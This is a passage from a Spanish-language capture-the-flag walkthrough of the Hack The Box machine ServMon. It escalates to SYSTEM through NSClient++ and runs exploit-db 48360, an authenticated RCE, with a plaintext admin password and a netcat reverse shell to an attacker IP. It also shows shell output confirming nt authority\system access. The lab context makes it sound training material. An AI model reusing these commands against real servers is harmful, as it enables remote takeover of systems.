- Nos ponemos en escucha por el puerto 443 y dentro del panel de **NSClient++** nos vamos a **Queries** y ya debemos tener nuestra reverse shell, en caso contrario, seleccioanamos nuestro script y le damos en **Run**.

![](/assets/images/htb-servmon/servmon-web8.png)

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.184] 49926
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system

C:\Program Files\NSClient++>
```

Ya estamos dentro de la máquina como `nt authority\system` y podemos visualizar la flag (root.txt).

Probando el otro exploit que encontramos, nos dice que es un script en python3; por lo tanto lo descargamos en nuestra máquina.

```bash
❯ searchsploit -m json/webapps/48360.txt
  Exploit: NSClient++ 0.5.2.35 - Authenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48360
     Path: /usr/share/exploitdb/exploits/json/webapps/48360.txt
File Type: Python script, ASCII text executable

Copied to: /home/k4miyo/Documentos/HTB/ServMon/exploits/48360.txt


❯ mv 48360.txt nsclient.py
```

Ahora si lo ejecutamos, vemos que nos pide algunos parámetros.

```bash
❯ python3 nsclient.py
usage: NSClient++ 0.5.2.35 Authenticated RCE [-h] [-t [target]] [-P [port]] [-p [password]] [-c [command]]

optional arguments:
  -h, --help     show this help message and exit
  -t [target]    Target IP Address.
  -P [port]      Target Port.
  -p [password]  NSClient++ Administrative Password.
  -c [command]   Command to execute on target
```

Ahora, como nos solicita la contraseña; es posible que el script se loguee en el servidor; por lo tanto necesitamos tener nuestro **Local Port Forwarding** y con el parámetro `-c` nos dice que recibe comandos para ejecutar a nivel de sistema; esto indica que podríamos subir nuestro archivo `nc.exe` a cualquier ruta donde tengamos permisos y con el exploit llamarlo para entablarnos una reverse shell. 

En este caso ya tenemos el archivo `nc.exe` en `C:\Temp`, así que nos ponemos en escucha por el puerto 443 y ejecutamos el exploit:

```bash
❯ python3 nsclient.py -t 127.0.0.1 -P 8443 -p "ew2x6SsGTxjRwXOT" -c "C:\Temp\nc.exe -e cmd 10.10.14.27 443"
[!] Targeting base URL https://127.0.0.1:8443
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Enabling External Scripts Module . . .
[!] Configuring Script with Specified Payload . . .
[+] Added External Script (name: xdozKLVGdAG)
[!] Saving Configuration . . .
[!] Reloading Application . . .
[!] Waiting for Application to reload . . .
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Triggering payload, should execute shortly . . .
[!] Timeout exceeded. Assuming your payload executed . . .
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.184] 50275
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system

C:\Program Files\NSClient++>
```

Y ya obtenemos acceso a la máquina como el usuario `nt authority\system`.
